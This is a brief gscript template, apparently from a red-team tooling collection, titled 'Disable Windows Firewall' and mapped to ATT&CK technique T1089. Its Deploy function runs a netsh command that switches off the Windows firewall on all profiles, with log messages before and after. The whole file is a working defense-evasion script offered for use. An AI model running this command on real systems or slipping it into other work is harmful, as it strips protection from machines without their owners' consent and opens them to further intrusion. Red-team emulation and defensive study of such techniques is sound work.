// Example gscript template
// Title: Disable Windows Firewall
// Author: ahhh
// Purpose: Drops the windows firewall by turning it off.
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Starting Disable Windows Firewall");
  return true; 
}

function Deploy() {  
  ExecuteCommand("netsh", ["advfirewall", "set", "allprofiles", "state", "off"]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Disable Windows Firewall");
  return true;
}